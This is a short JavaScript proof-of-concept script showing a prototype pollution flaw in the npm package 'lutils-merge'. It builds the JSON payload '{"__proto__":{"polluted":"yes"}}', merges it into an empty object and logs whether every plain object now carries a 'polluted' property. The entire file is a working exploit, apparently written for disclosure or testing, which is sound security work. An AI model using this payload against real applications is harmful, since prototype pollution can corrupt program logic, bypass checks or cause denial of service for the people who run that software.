var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('lutils-merge');
const payload = '{"__proto__":{"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
merge(obj, JSON.parse(payload));
console.log({}.polluted);